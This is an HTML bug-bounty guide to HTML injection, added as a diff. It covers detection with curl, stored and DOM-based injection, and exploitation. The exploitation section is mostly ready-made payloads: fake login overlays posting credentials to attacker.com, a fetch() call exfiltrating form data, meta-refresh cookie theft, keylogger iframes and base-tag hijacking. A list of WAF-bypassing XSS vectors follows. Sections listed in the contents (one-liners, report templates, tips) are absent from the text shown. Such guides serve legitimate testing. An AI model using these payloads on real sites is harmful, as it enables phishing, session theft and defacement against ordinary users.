@@ -1,0 +1,910 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>HTML Injection Bug Bounty Guide</title>
+<style>
+body { margin: 0; padding: 0; font-family: Georgia, 'Noto Serif', serif; font-size: 11pt; line-height: 1.65; color: #2c3e50; }
+@page { size: A4; margin: 2.2cm 2cm; @top-center { content: string(doctitle); font-size: 9pt; color: #7f8c8d; } @bottom-center { content: counter(page); font-size: 9pt; color: #7f8c8d; } }
+@page cover { margin: 0; @top-center { content: none; } @bottom-center { content: none; } }
+@page toc { @top-center { content: none; } @bottom-center { content: none; } }
+body { string-set: doctitle ""; }
+h1 { string-set: doctitle content(); }
+
+.cover { page: cover; width: 210mm; height: 297mm; margin: 0; position: relative; overflow: hidden; page-break-after: always; background: linear-gradient(135deg, #0f0c29 0%, #302b63 40%, #24243e 100%); }
+.c-shape { position: absolute; border-radius: 50%; opacity: 0.07; }
+.c1 { width: 400px; height: 400px; background: #e94560; top: -100px; right: -100px; }
+.c2 { width: 300px; height: 300px; background: #0f3460; bottom: 50px; left: -80px; }
+.c3 { width: 200px; height: 200px; background: #e94560; bottom: -60px; right: 100px; }
+.lines { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: repeating-linear-gradient(45deg, transparent, transparent 35px, rgba(255,255,255,0.015) 35px, rgba(255,255,255,0.015) 70px); }
+.cover-content { position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%); text-align: center; width: 82%; z-index: 5; }
+.cover-icon { font-size: 64pt; margin-bottom: 20px; }
+.cover-title { font-size: 38pt; font-weight: 700; color: #ffffff; margin: 0 0 12px 0; letter-spacing: 1px; text-transform: uppercase; }
+.cover-sub { font-size: 15pt; color: #e94560; margin-bottom: 50px; font-weight: 400; letter-spacing: 2px; }
+.cover-line { width: 80px; height: 3px; background: #e94560; margin: 0 auto 40px; }
+.cover-meta { font-size: 11pt; color: rgba(255,255,255,0.7); line-height: 2; }
+
+.toc-page { page: toc; page-break-after: always; padding-top: 30px; }
+.toc-title { font-size: 22pt; color: #1a1a2e; margin-bottom: 30px; border-bottom: 3px solid #e94560; padding-bottom: 10px; }
+.toc ul { list-style: none; padding: 0; margin: 0; }
+.toc li { margin: 10px 0; font-size: 11.5pt; }
+.toc a { text-decoration: none; color: #2c3e50; display: flex; align-items: baseline; }
+.toc a::after { content: leader('.') target-counter(attr(href url), page); flex-shrink: 0; margin-left: 8px; }
+.toc .l1 { font-weight: 600; }
+.toc .l2 { padding-left: 20px; font-size: 11pt; }
+
+h1 { font-size: 20pt; color: #1a1a2e; margin-top: 0; margin-bottom: 16px; padding-bottom: 8px; border-bottom: 2px solid #e94560; page-break-after: avoid; }
+h2 { font-size: 14pt; color: #16213e; margin-top: 24px; margin-bottom: 10px; padding-left: 10px; border-left: 4px solid #e94560; page-break-after: avoid; }
+h3 { font-size: 12pt; color: #0f3460; margin-top: 18px; margin-bottom: 8px; }
+
+.tip, .warn, .info { padding: 12px 16px; margin: 14px 0; border-radius: 4px; font-size: 10.5pt; page-break-inside: avoid; }
+.tip { background: #e8f5e9; border-left: 4px solid #4caf50; }
+.warn { background: #ffebee; border-left: 4px solid #f44336; }
+.info { background: #e3f2fd; border-left: 4px solid #2196f3; }
+.call-title { font-weight: 700; margin-bottom: 4px; font-size: 10.5pt; }
+
+pre { background: #1e1e2e; color: #c7d0d9; padding: 14px 16px; border-radius: 6px; overflow-x: auto; font-family: 'JetBrains Mono', monospace; font-size: 9pt; line-height: 1.5; margin: 12px 0; page-break-inside: avoid; max-width: 100%; white-space: pre-wrap; word-break: break-all; }
+code { font-family: 'JetBrains Mono', monospace; font-size: 9.5pt; background: #f0f0f0; padding: 2px 6px; border-radius: 3px; color: #e94560; }
+pre code { background: none; padding: 0; color: inherit; }
+
+table { width: 100%; border-collapse: collapse; margin: 14px 0; font-size: 10pt; page-break-inside: avoid; max-width: 100%; }
+thead { display: table-header-group; }
+thead tr { border-top: 2px solid #1a1a2e; border-bottom: 2px solid #1a1a2e; }
+th { padding: 10px 8px; text-align: left; font-weight: 600; color: #1a1a2e; background: #f8f9fa; }
+td { padding: 8px; border-bottom: 1px solid #ddd; vertical-align: top; }
+tbody tr:last-child { border-bottom: 2px solid #1a1a2e; }
+tr { page-break-inside: avoid; }
+
+.badge { display: inline-block; padding: 2px 10px; border-radius: 12px; font-size: 8.5pt; font-weight: 600; margin-right: 6px; }
+.b-crit { background: #ffebee; color: #c62828; }
+.b-high { background: #fff3e0; color: #e65100; }
+.b-med { background: #fff8e1; color: #f9a825; }
+.b-low { background: #e8f5e9; color: #2e7d32; }
+.b-info { background: #e3f2fd; color: #1565c0; }
+
+.dork { background: #f8f9fa; border: 1px solid #e0e0e0; border-radius: 6px; padding: 12px 14px; margin: 10px 0; page-break-inside: avoid; }
+.dork-title { font-weight: 700; color: #1a1a2e; margin-bottom: 6px; font-size: 11pt; }
+.dork-desc { font-size: 10pt; color: #555; margin-bottom: 8px; }
+.dork-tags { margin-top: 8px; }
+
+.section { margin-bottom: 10px; }
+p { margin: 8px 0; }
+ul, ol { margin: 8px 0; padding-left: 24px; }
+li { margin: 4px 0; }
+strong { color: #1a1a2e; }
+
+.report-box { background: #fff3e0; border: 1px solid #ffb74d; border-radius: 6px; padding: 14px 16px; margin: 14px 0; page-break-inside: avoid; }
+.report-title { font-weight: 700; color: #e65100; margin-bottom: 8px; font-size: 11pt; border-bottom: 1px solid #ffb74d; padding-bottom: 4px; }
+</style>
+</head>
+<body>
+
+<div class="cover">
+  <div class="c-shape c1"></div>
+  <div class="c-shape c2"></div>
+  <div class="c-shape c3"></div>
+  <div class="lines"></div>
+  <div class="cover-content">
+    <div class="cover-icon">&#128270;</div>
+    <h1 class="cover-title" style="border:none;color:#fff;padding:0;margin:0 0 12px 0;">HTML Injection</h1>
+    <p class="cover-sub">Bug Bounty Hunting Guide</p>
+    <div class="cover-line"></div>
+    <div class="cover-meta">
+      <p>Reflected | Stored | DOM-Based | Escalation</p>
+      <p>Defacement | Phishing | Cookie Theft | Keylogging</p>
+      <p style="margin-top:20px;">2025 Edition</p>
+    </div>
+  </div>
+</div>
+
+<div class="toc-page">
+  <h1 class="toc-title">Table of Contents</h1>
+  <nav class="toc">
+    <ul>
+      <li class="l1"><a href="#s1">1. Introduction to HTML Injection</a></li>
+      <li class="l1"><a href="#s2">2. Detection Methods</a></li>
+      <li class="l1"><a href="#s3">3. Reflected HTML Injection</a></li>
+      <li class="l1"><a href="#s4">4. Stored HTML Injection</a></li>
+      <li class="l1"><a href="#s5">5. DOM-Based HTML Injection</a></li>
+      <li class="l1"><a href="#s6">6. Advanced Exploitation</a></li>
+      <li class="l2"><a href="#s6-1">6.1 Defacement</a></li>
+      <li class="l2"><a href="#s6-2">6.2 Fake Login Forms</a></li>
+      <li class="l2"><a href="#s6-3">6.3 Cookie &amp; Token Theft</a></li>
+      <li class="l2"><a href="#s6-4">6.4 Keylogging</a></li>
+      <li class="l2"><a href="#s6-5">6.5 Redirect Hijacking</a></li>
+      <li class="l2"><a href="#s6-6">6.6 HTML to XSS Escalation</a></li>
+      <li class="l1"><a href="#s7">7. WAF Bypass Techniques</a></li>
+      <li class="l1"><a href="#s8">8. Tools &amp; Automation</a></li>
+      <li class="l1"><a href="#s9">9. One-Liners</a></li>
+      <li class="l1"><a href="#s10">10. Report Templates</a></li>
+      <li class="l1"><a href="#s11">11. Tips &amp; Tricks</a></li>
+    </ul>
+  </nav>
+</div>
+
+<!-- ==================== SECTION 1 ==================== -->
+<div class="section" id="s1">
+<h1>1. Introduction to HTML Injection</h1>
+
+<p>HTML Injection occurs when untrusted user input is rendered directly into a web page without proper sanitization or encoding. Unlike XSS which requires JavaScript execution, HTML Injection allows attackers to inject arbitrary HTML markup, enabling defacement, phishing, credential harvesting, and chained attacks that escalate to XSS.</p>
+
+<div class="info">
+  <div class="call-title">HTML Injection vs XSS</div>
+  <strong>HTML Injection</strong> injects HTML markup (tags, attributes) that renders in the page. <strong>XSS</strong> injects JavaScript that executes in the victim's browser. HTML Injection often serves as a stepping stone to XSS when event handlers or scriptable attributes are allowed. Even without JavaScript, HTML Injection can be exploited for phishing, UI manipulation, and data theft.
+</div>
+
+<table>
+<thead><tr><th>Type</th><th>Severity</th><th>Impact</th></tr></thead>
+<tbody>
+<tr><td>Reflected HTML Injection <span class="badge b-med">Medium</span></td><td>P3/P4</td><td>Phishing via crafted links, defacement</td></tr>
+<tr><td>Stored HTML Injection <span class="badge b-high">High</span></td><td>P2/P3</td><td>Persistent defacement, phishing for all users</td></tr>
+<tr><td>DOM-Based HTML Injection <span class="badge b-high">High</span></td><td>P2/P3</td><td>Client-side rendering bypasses server filters</td></tr>
+<tr><td>HTML Injection to Stored XSS <span class="badge b-crit">Critical</span></td><td>P1/P2</td><td>Account takeover, session hijacking</td></tr>
+<tr><td>HTML Injection in Email <span class="badge b-high">High</span></td><td>P2/P3</td><td>Email phishing, credential harvesting</td></tr>
+</tbody>
+</table>
+
+</div>
+
+<!-- ==================== SECTION 2 ==================== -->
+<div class="section" id="s2">
+<h1>2. Detection Methods</h1>
+
+<h3>Basic Detection</h3>
+
+<pre># Test URL parameters for HTML reflection
+curl -s "https://target.com/search?q=&lt;b&gt;test&lt;/b&gt;" | grep -i "&lt;b&gt;test&lt;/b&gt;"
+
+# Test with common HTML tags
+curl -s "https://target.com/page?title=&lt;h1&gt;Hacked&lt;/h1&gt;" | grep "&lt;h1&gt;Hacked&lt;/h1&gt;"
+curl -s "https://target.com/page?color=&lt;marquee&gt;test&lt;/marquee&gt;" | grep "&lt;marquee&gt;"
+
+# Test form fields
+curl -X POST https://target.com/feedback \
+  -d "name=&lt;b&gt;test&lt;/b&gt;&email=test@test.com" | grep "&lt;b&gt;test&lt;/b&gt;"
+
+# Test headers (Referer, User-Agent)
+curl -s https://target.com/ \
+  -H "Referer: &lt;b&gt;injected&lt;/b&gt;" | grep "&lt;b&gt;injected&lt;/b&gt;"
+
+# Test cookie values
+curl -s https://target.com/ \
+  -H "Cookie: pref=&lt;font color=red&gt;test&lt;/font&gt;" | grep "color=red"
+
+# Test JSON fields
+curl -X POST https://target.com/api/profile \
+  -H "Content-Type: application/json" \
+  -d '{"bio": "&lt;h1&gt;HTML Injection&lt;/h1&gt;"}'
+
+# Test with XML
+curl -X POST https://target.com/api/comment \
+  -H "Content-Type: application/xml" \
+  -d '&lt;comment&gt;&lt;body&gt;&lt;b&gt;test&lt;/b&gt;&lt;/body&gt;&lt;/comment&gt;'
+
+# Test in different contexts:
+# 1. Between tags: &lt;div&gt;INJECTION&lt;/div&gt;
+# 2. Inside attribute: &lt;div class="INJECTION"&gt;
+# 3. Inside href: &lt;a href="INJECTION"&gt;
+# 4. Inside style: &lt;div style="INJECTION"&gt;
+# 5. Inside script: var x = 'INJECTION';</pre>
+
+<h3>Context-Specific Detection</h3>
+
+<pre># Between HTML tags
+curl -s "https://target.com/?q=&lt;b&gt;bold&lt;/b&gt;" | grep "&lt;b&gt;"
+
+# Inside an attribute value
+curl -s "https://target.com/?class=&lt;b&gt;test&lt;/b&gt;" | grep "class="
+# Look for: &lt;div class="&lt;b&gt;test&lt;/b&gt;"&gt;
+
+# Inside a tag name (rare but possible)
+curl -s "https://target.com/?tag=&lt;b" | grep "&lt;b"
+
+# Inside a comment
+curl -s "https://target.com/?comment=--&gt;&lt;b&gt;test&lt;/b&gt;&lt;!--" | grep "&lt;b&gt;"
+
+# Inside a textarea
+curl -s "https://target.com/?note=&lt;/textarea&gt;&lt;b&gt;test&lt;/b&gt;" | grep "&lt;/textarea&gt;"
+
+# Inside a script string
+curl -s "https://target.com/?msg=';alert(1);//" | grep "alert"
+
+# Inside a style block
+curl -s "https://target.com/?theme=&lt;/style&gt;&lt;b&gt;test&lt;/b&gt;" | grep "&lt;/style&gt;"
+
+# Inside a noscript block
+curl -s "https://target.com/?data=&lt;/noscript&gt;&lt;b&gt;test&lt;/b&gt;" | grep "&lt;/noscript&gt;"
+
+# HTML entity bypass testing
+curl -s "https://target.com/?q=%3Cb%3Etest%3C/b%3E" | grep "&lt;b&gt;"
+curl -s "https://target.com/?q=&amp;lt;b&amp;gt;test&amp;lt;/b&amp;gt;" | grep "&lt;b&gt;"
+# If the application decodes entities, injection works</pre>
+
+</div>
+
+<!-- ==================== SECTION 3 ==================== -->
+<div class="section" id="s3">
+<h1>3. Reflected HTML Injection</h1>
+
+<p>Reflected HTML Injection occurs when user input is immediately returned in the response without persistent storage. The victim must click a crafted link to trigger the injection.</p>
+
+<h3>URL Parameter Injection</h3>
+
+<pre># Search parameter reflection
+curl -s "https://target.com/search?q=&lt;h1&gt;Your Account is Suspended&lt;/h1&gt;" | grep "&lt;h1&gt;"
+
+# Error message reflection
+curl -s "https://target.com/error?msg=&lt;div style='color:red;font-size:30px;'&gt;CRITICAL ERROR&lt;/div&gt;" | grep "CRITICAL ERROR"
+
+# Title/heading injection
+curl -s "https://target.com/page?title=&lt;h1&gt;Hacked by Attacker&lt;/h1&gt;" | grep "&lt;h1&gt;"
+
+# Redirect message injection
+curl -s "https://target.com/redirect?to=/home&amp;msg=&lt;h1&gt;Please Login Again&lt;/h1&gt;" | grep "Please Login Again"
+
+# Form prefill injection (value attribute)
+curl -s "https://target.com/login?email=&lt;input type=password name=pass&gt;" | grep "type=password"
+# Renders: &lt;input value="&lt;input type=password name=pass&gt;"&gt;</pre>
+
+<h3>HTTP Header Injection</h3>
+
+<pre># Referer-based reflection
+curl -s -H "Referer: &lt;b&gt;Suspicious Activity Detected&lt;/b&gt;" \
+  https://target.com/ | grep "Suspicious Activity"
+
+# User-Agent reflection
+curl -s -H "User-Agent: &lt;h1&gt;Your Browser is Outdated&lt;/h1&gt;" \
+  https://target.com/browser-check | grep "Browser is Outdated"
+
+# Cookie-based reflection
+curl -s -H "Cookie: lastpage=&lt;img src=x onerror=alert(1)&gt;" \
+  https://target.com/ | grep "img src=x"
+
+# X-Forwarded-Host reflection
+curl -s -H "X-Forwarded-Host: &lt;b&gt;WARNING&lt;/b&gt;" \
+  https://target.com/ | grep "WARNING"</pre>
+
+<h3>Multi-Parameter Injection</h3>
+
+<pre># Split payload across multiple parameters
+curl -s "https://target.com/page?open=&lt;div style='position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;'&gt;&close=&lt;/div&gt;" | grep "position:fixed"
+
+# One parameter opens tag, another closes
+curl -s "https://target.com/display?before=&lt;table&gt;&amp;content=test&amp;after=&lt;/table&gt;" | grep "&lt;table&gt;"
+
+# Parameter pollution for tag completion
+curl -s "https://target.com/search?q=&lt;div id='&amp;q=' style='color:red'&gt;Hacked&lt;/div&gt;" | grep "color:red"</pre>
+
+</div>
+
+<!-- ==================== SECTION 4 ==================== -->
+<div class="section" id="s4">
+<h1>4. Stored HTML Injection</h1>
+
+<p>Stored HTML Injection persists in the application's database and affects all users who view the injected content. This is higher severity than reflected injection because it doesn't require a crafted link.</p>
+
+<h3>Common Stored Injection Points</h3>
+
+<pre># Profile bio/About Me
+# Comment sections
+# Forum posts
+# Product reviews
+# Chat messages
+# Support tickets
+# Admin notes
+# File metadata (filename, description)
+# Email subjects (if displayed in web UI)
+# Notification messages
+
+# Profile bio stored injection test
+curl -X POST https://target.com/api/profile \
+  -H "Content-Type: application/json" \
+  -H "Cookie: session=VALID" \
+  -d '{"bio": "&lt;h1&gt;Account Compromised&lt;/h1&gt;&lt;p&gt;Contact support immediately.&lt;/p&gt;"}'
+
+# Verify stored content renders HTML
+curl -s https://target.com/user/profile | grep "Account Compromised"
+
+# Comment stored injection
+curl -X POST https://target.com/api/comments \
+  -H "Content-Type: application/json" \
+  -d '{"post_id": "123", "content": "&lt;div style=background:red&gt;&lt;h1&gt;ADMIN WARNING&lt;/h1&gt;&lt;/div&gt;"}'
+
+# Review stored injection
+curl -X POST https://target.com/api/reviews \
+  -H "Content-Type: application/json" \
+  -d '{"product_id": "456", "review": "&lt;marquee&gt;&lt;h1&gt;SCAM ALERT&lt;/h1&gt;&lt;/marquee&gt;"}'
+
+# Username stored injection
+curl -X POST https://target.com/api/register \
+  -H "Content-Type: application/json" \
+  -d '{"username": "&lt;b&gt;ADMIN&lt;/b&gt;", "email": "test@test.com"}'
+
+# Chat message stored injection
+curl -X POST https://target.com/api/messages \
+  -H "Content-Type: application/json" \
+  -H "Cookie: session=VALID" \
+  -d '{"to": "victim", "message": "&lt;h1&gt;System Notification&lt;/h1&gt;&lt;p&gt;Your password has expired.&lt;/p&gt;"}'
+
+# File upload description stored injection
+curl -X POST https://target.com/api/upload \
+  -F "file=@photo.jpg" \
+  -F "description=&lt;h1&gt;VIRUS DETECTED&lt;/h1&gt;"</pre>
+
+</div>
+
+<!-- ==================== SECTION 5 ==================== -->
+<div class="section" id="s5">
+<h1>5. DOM-Based HTML Injection</h1>
+
+<p>DOM-Based HTML Injection occurs entirely in the browser when JavaScript writes user-controlled input into the DOM without sanitization. Server-side filters do not protect against this.</p>
+
+<h3>Common DOM Sinks</h3>
+
+<pre># innerHTML sink
+document.getElementById('output').innerHTML = location.hash.slice(1);
+# Payload: #&lt;h1&gt;Hacked&lt;/h1&gt;
+
+# outerHTML sink
+document.querySelector('.user-input').outerHTML = userInput;
+
+# insertAdjacentHTML sink
+element.insertAdjacentHTML('beforeend', userInput);
+
+# document.write sink
+document.write('&lt;div&gt;' + urlParams.message + '&lt;/div&gt;');
+
+# jQuery html() sink
+$('#output').html(location.search);
+
+# AngularJS ng-bind-html
+# &lt;div ng-bind-html="userInput"&gt;&lt;/div&gt;
+
+# React dangerouslySetInnerHTML
+# &lt;div dangerouslySetInnerHTML={{__html: userInput}} /&gt;
+
+# Vue v-html directive
+# &lt;div v-html="userInput"&gt;&lt;/div&gt;
+
+# location.hash DOM injection test:
+# https://target.com/page#&lt;h1&gt;Injected&lt;/h1&gt;
+
+# location.search DOM injection test:
+# https://target.com/page?msg=&lt;h1&gt;Injected&lt;/h1&gt;
+
+# postMessage DOM injection:
+window.addEventListener('message', function(e) {
+  document.getElementById('banner').innerHTML = e.data;
+});
+# Send message from attacker page:
+# targetWindow.postMessage('&lt;h1&gt;Hacked&lt;/h1&gt;', '*');</pre>
+
+<h3>DOM-Based Detection</h3>
+
+<pre># Check for hash-based DOM injection
+curl -s "https://target.com/app#&lt;b&gt;test&lt;/b&gt;" | grep "&lt;b&gt;test&lt;/b&gt;"
+# Note: server won't see hash, check browser DevTools
+
+# Check for search-based DOM injection
+curl -s "https://target.com/app?display=&lt;b&gt;test&lt;/b&gt;" | grep "&lt;b&gt;test&lt;/b&gt;"
+
+# Check JavaScript for sinks
+# In browser console:
+grep -r "innerHTML\|outerHTML\|insertAdjacentHTML\|document.write\|\.html(\|dangerouslySetInnerHTML\|v-html\|ng-bind-html" app.js
+
+# Using LinkFinder to find JS files, then grep for sinks:
+echo "target.com" | getJS | while read js; do
+  echo "=== $js ==="
+  curl -s "$js" | grep -oE "(innerHTML|outerHTML|insertAdjacentHTML|document\.write)" | sort | uniq -c
+done</pre>
+
+</div>
+
+<!-- ==================== SECTION 6 ==================== -->
+<div class="section" id="s6">
+<h1>6. Advanced Exploitation</h1>
+
+<h2 id="s6-1">6.1 Defacement</h2>
+
+<pre># Full page overlay defacement
+&lt;h1 style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:99999;padding:50px;"&gt;
+  &lt;center&gt;
+    &lt;h1 style="color:red;"&gt;THIS SITE HAS BEEN HACKED&lt;/h1&gt;
+    &lt;p&gt;By Attacker - Contact security@example.com&lt;/p&gt;
+  &lt;/center&gt;
+&lt;/h1&gt;
+
+# Partial defacement - replace specific elements
+&lt;div style="position:absolute;top:0;left:0;width:100%;height:100px;background:#d32f2f;color:white;text-align:center;line-height:100px;font-size:30px;"&gt;
+  SECURITY BREACH - DO NOT ENTER CREDENTIALS
+&lt;/div&gt;
+
+# Redirect overlay (appears to be the real site but isn't)
+&lt;iframe src="https://attacker.com/fake-site" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;border:none;"&gt;&lt;/iframe&gt;</pre>
+
+<h2 id="s6-2">6.2 Fake Login Forms</h2>
+
+<pre># Overlay fake login form on real page
+&lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);z-index:99998;display:flex;align-items:center;justify-content:center;"&gt;
+  &lt;div style="background:white;padding:40px;border:1px solid #ddd;box-shadow:0 4px 20px rgba(0,0,0,0.15);width:400px;"&gt;
+    &lt;h2 style="margin-top:0;"&gt;Session Expired&lt;/h2&gt;
+    &lt;p&gt;Please login again to continue&lt;/p&gt;
+    &lt;form action="https://attacker.com/collect" method="POST"&gt;
+      &lt;input type="email" name="email" placeholder="Email" style="width:100%;padding:10px;margin-bottom:10px;"&gt;
+      &lt;input type="password" name="password" placeholder="Password" style="width:100%;padding:10px;margin-bottom:10px;"&gt;
+      &lt;button type="submit" style="width:100%;padding:10px;background:#1976d2;color:white;border:none;"&gt;Login&lt;/button&gt;
+    &lt;/form&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+
+# Inline fake form injection
+&lt;div style="border:2px solid red;padding:20px;margin:20px;"&gt;
+  &lt;h3&gt;Security Alert - Re-authentication Required&lt;/h3&gt;
+  &lt;form onsubmit="fetch('https://attacker.com/steal',{method:'POST',body:new FormData(this)});return false;"&gt;
+    &lt;input type="text" name="user" placeholder="Username"&gt;
+    &lt;input type="password" name="pass" placeholder="Password"&gt;
+    &lt;button&gt;Verify Identity&lt;/button&gt;
+  &lt;/form&gt;
+&lt;/div&gt;</pre>
+
+<h2 id="s6-3">6.3 Cookie &amp; Token Theft</h2>
+
+<pre># Meta refresh token theft (no JavaScript needed)
+&lt;meta http-equiv="refresh" content="0;url=https://attacker.com/steal?cookie=document.cookie"&gt;
+
+# Image tag for cookie exfiltration (if cookies are in URL)
+&lt;img src="https://attacker.com/log?cookie=" width="1" height="1"&gt;
+
+# Form auto-submit to steal data
+&lt;form id="steal" action="https://attacker.com/collect" method="POST"&gt;
+  &lt;input type="hidden" name="data" value="stolen_info"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('steal').submit();&lt;/script&gt;
+
+# CSS-based token extraction (theoretical, very limited)
+# @import url with token as parameter
+# Not practical but worth testing</pre>
+
+<h2 id="s6-4">6.4 Keylogging</h2>
+
+<pre># Form action hijacking via HTML injection
+# Inject a form that captures input and sends to attacker
+
+&lt;form action="https://attacker.com/keylog" method="POST" id="logger"&gt;
+  &lt;input type="hidden" name="keys" id="keydata"&gt;
+&lt;/form&gt;
+
+# If JavaScript event handlers are blocked but we can inject a form,
+# we can use the form's onsubmit or use a meta refresh to periodically submit
+
+# If the application allows iframes in HTML injection:
+&lt;iframe src="https://attacker.com/keylogger" style="width:1px;height:1px;"&gt;&lt;/iframe&gt;</pre>
+
+<h2 id="s6-5">6.5 Redirect Hijacking</h2>
+
+<pre># Meta refresh redirect
+&lt;meta http-equiv="refresh" content="0;url=https://attacker.com/phishing"&gt;
+
+# Base tag hijacking (changes all relative URLs)
+&lt;base href="https://attacker.com/"&gt;
+
+# Form action hijacking
+&lt;form action="https://attacker.com/collect" method="POST"&gt;
+  &lt;!-- Form fields mirror the real form --&gt;
+&lt;/form&gt;
+
+# Anchor tag hijacking
+&lt;a href="https://attacker.com/fake-login" style="display:block;padding:20px;background:red;color:white;text-align:center;"&gt;
+  Click here to verify your account
+&lt;/a&gt;</pre>
+
+<h2 id="s6-6">6.6 HTML to XSS Escalation</h2>
+
+<pre># Test if HTML injection allows event handlers
+curl -s "https://target.com/page?msg=&lt;img src=x onerror=alert(1)&gt;" | grep "img src"
+
+# If event handlers are blocked, try other vectors:
+# SVG with foreignObject
+curl -s "https://target.com/page?msg=&lt;svg&gt;&lt;foreignObject&gt;&lt;body onload=alert(1)&gt;&lt;/body&gt;&lt;/foreignObject&gt;&lt;/svg&gt;"
+
+# MathML with href
+curl -s "https://target.com/page?msg=&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;img src=x onerror=alert(1)&gt;"
+
+# Audio/Video tags with onerror
+curl -s "https://target.com/page?msg=&lt;audio src=x onerror=alert(1)&gt;"
+curl -s "https://target.com/page?msg=&lt;video src=x onerror=alert(1)&gt;"
+
+# Details/summary with ontoggle
+curl -s "https://target.com/page?msg=&lt;details open ontoggle=alert(1)&gt;&lt;summary&gt;test&lt;/summary&gt;&lt;/details&gt;"
+
+# Input with onfocus + autofocus
+curl -s "https://target.com/page?msg=&lt;input onfocus=alert(1) autofocus&gt;"
+
+# Select with onchange
+curl -s "https://target.com/page?msg=&lt;select onchange=alert(1)&gt;&lt;option&gt;a&lt;/option&gt;&lt;option&gt;b&lt;/option&gt;&lt;/select&gt;"
+
+# iframe with javascript: src
+curl -s "https://target.com/page?msg=&lt;iframe src=javascript:alert(1)&gt;"
+
+# object with data attribute
+curl -s "https://target.com/page?msg=&lt;object data=javascript:alert(1)&gt;"
+
+# embed with src attribute
+curl -s "https://target.com/page?msg=&lt;embed src=javascript:alert(1)&gt;"
+
+# Form with formaction
+curl -s "https://target.com/page?msg=&lt;button formaction=javascript:alert(1)&gt;Click&lt;/button&gt;"
+
+# Marquee with onstart/onfinish (Firefox)
+curl -s "https://target.com/page?msg=&lt;marquee onstart=alert(1)&gt;test&lt;/marquee&gt;"
+
+# Body with onload
+curl -s "https://target.com/page?msg=&lt;body onload=alert(1)&gt;"
+
+# Frameset with onload
+curl -s "https://target.com/page?msg=&lt;frameset onload=alert(1)&gt;&lt;frame src=about:blank&gt;&lt;/frameset&gt;"
+
+# Table background with javascript: URI (old IE)
+curl -s "https://target.com/page?msg=&lt;table background=javascript:alert(1)&gt;&lt;tr&gt;&lt;td&gt;test&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;"
+
+# Style with expression (old IE)
+curl -s "https://target.com/page?msg=&lt;div style=width:expression(alert(1))&gt;"
+
+# @import with javascript (rare)
+curl -s "https://target.com/page?msg=&lt;style&gt;@import url(javascript:alert(1))&lt;/style&gt;"</pre>
+
+</div>
+
+<!-- ==================== SECTION 7 ==================== -->
+<div class="section" id="s7">
+<h1>7. WAF Bypass Techniques</h1>
+
+<pre># Case variation bypass
+curl -s "https://target.com/page?msg=&lt;IMG SRC=X ONERROR=ALERT(1)&gt;"
+curl -s "https://target.com/page?msg=&lt;Img sRc=x oNeRrOr=alert(1)&gt;"
+
+# Encoding bypass
+curl -s "https://target.com/page?msg=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"
+curl -s "https://target.com/page?msg=&lt;img%20src%3dx%20onerror%3dalert(1)&gt;"
+
+# Double encoding
+curl -s "https://target.com/page?msg=%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E"
+
+# HTML entities bypass
+curl -s "https://target.com/page?msg=&lt;img src=x onerror=&amp;#x61;lert(1)&gt;"
+curl -s "https://target.com/page?msg=&lt;img src=x onerror=&amp;#97;lert(1)&gt;"
+
+# Null byte injection (older systems)
+curl -s "https://target.com/page?msg=&lt;img%00src=x%00onerror=alert(1)&gt;"
+
+# Tab/space/newline breaking
+curl -s "https://target.com/page?msg=&lt;img%09src=x%09onerror=alert(1)&gt;"
+curl -s "https://target.com/page?msg=&lt;img%0asrc=x%0aonerror=alert(1)&gt;"
+
+# Protocol-relative and data URI
+curl -s "https://target.com/page?msg=&lt;iframe src=//attacker.com/keylogger&gt;"
+curl -s "https://target.com/page?msg=&lt;img src=data:image/svg+xml,&lt;svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/&gt;"
+
+# SVG with encoded content
+curl -s "https://target.com/page?msg=&lt;svg/onload=alert(1)&gt;"
+curl -s "https://target.com/page?msg=&lt;svg%20onload=alert(1)&gt;"
+
+# Template literal bypass (if innerHTML is used)
+curl -s "https://target.com/page?msg=&lt;img src=x onerror=\`alert(1)\`&gt;"
+
+# Unicode normalization
+curl -s "https://target.com/page?msg=&lt;img%EF%BC%9E%EF%BC%9Csrc=x%EF%BC%9E%EF%BC%9Conerror=alert(1)%EF%BC%9E%EF%BC%9C"
+# Uses full-width Unicode characters that normalize to <>
+
+# Comments inside tags to break filters
+curl -s "https://target.com/page?msg=&lt;img src=x onerror=alert(1)//&gt;"
+curl -s "https://target.com/page?msg=&lt;img src=x onerror=alert(1)/*--&gt;"</pre>
+
+</div>
+
+<!-- ==================== SECTION 8 ==================== -->
+<div class="section" id="s8">
+<h1>8. Tools &amp; Automation</h1>
+
+<table>
+<thead><tr><th>Tool</th><th>Purpose</th><th>Usage</th></tr></thead>
+<tbody>
+<tr><td><strong>curl</strong></td><td>Manual injection testing</td><td><code>curl -s "URL?param=&lt;b&gt;test&lt;/b&gt;"</code></td></tr>
+<tr><td><strong>Burp Suite</strong></td><td>Proxy, Repeater, Intruder</td><td>Match/replace for HTML injection</td></tr>
+<tr><td><strong>OWASP ZAP</strong></td><td>Automated scanner</td><td>Active scan for HTML injection</td></tr>
+<tr><td><strong>dalfox</strong></td><td>XSS finder (finds HTML sinks)</td><td><code>dalfox url "https://target.com"</code></td></tr>
+<tr><td><strong>XSStrike</strong></td><td>XSS detection</td><td><code>xsstrike -u "https://target.com"</code></td></tr>
+<tr><td><strong>ffuf</strong></td><td>Fuzz parameters</td><td><code>ffuf -u URL -w payloads.txt</code></td></tr>
+<tr><td><strong>httpx</strong></td><td>Response analysis</td><td><code>httpx -mr "&lt;h1&gt;"</code></td></tr>
+<tr><td><strong>nuclei</strong></td><td>Template scanning</td><td><code>nuclei -u target.com -t xss*</code></td></tr>
+<tr><td><strong>kxss</strong></td><td>Reflected parameter finder</td><td><code>cat urls | kxss</code></td></tr>
+</tbody>
+</table>
+
+</div>
+
